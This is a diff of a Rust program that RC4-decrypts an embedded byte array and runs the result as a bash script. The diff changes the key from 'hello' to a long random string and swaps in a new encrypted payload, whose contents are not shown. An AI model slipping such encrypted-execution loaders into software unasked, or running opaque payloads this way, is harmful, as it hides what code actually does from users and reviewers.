@@ -77,7 +77,8 @@ fn run_process(iterp: &String, prog: &String, args: &Vec<String>) {
 }
 
 fn main() {
-    let prog = vec![106, 50, 215, 149, 139, 138, 159, 109, 47, 253, 146, 61, 174, 227, 183, 52, 57, 144, 3, 109, 141, 187, 18, 27, 123, 146, 199, 192, 160, 177, 241, 219, 103, 110, 209, 102, 183, 86, 70, 130, 121, 142, 222, 52, 174, 63, 141, 158, 247, 150, 83, 0, 128, 24, 135, 89, 30, 83, 149, 78, 200, 218, 13, 170, 72, 222, 20, 54, 251, 157, 42, 106, 176];
+    let prog = vec![238, 252, 168, 191, 125, 171, 142, 207, 8, 145, 199, 80, 150, 205, 167, 214, 253, 55, 206, 232, 231, 114, 216, 145, 196, 147, 0, 16, 57, 187, 195, 236, 164, 58, 213, 200, 203, 171, 228, 130, 180, 196, 122, 212, 173, 55, 97, 175, 191, 98, 88, 122, 20, 118, 8, 106, 88, 160, 240, 50, 102, 55, 152, 121, 208, 145, 249, 253, 29, 94, 206, 69, 241];
+    let rand_key = "H17LbAVbFbKOducny1qALB22c8LAXv9seSKQj8Uo1f5cYklZKDzdApul7yJlQE60G8tHEYPFzEPN6QzaGxC5wVK6BEt6Y1bAry5kDnAGQkLMUKqRKD7dAcUA04PntHL2";
     let pass = "";
     let iterp = "bash";
 
@@ -94,7 +95,7 @@ fn main() {
             process::exit(1);
         }
     }
-    let prog_vec = Arc4::new(b"hello").trans_vec(&prog);
+    let prog_vec = Arc4::new(rand_key.to_string().as_bytes()).trans_vec(&prog);
     let prog_str = String::from_utf8(prog_vec).unwrap();
     //println!("running ...:\n {}", prog_str);
     let mut args = env::args().collect::<Vec<_>>();
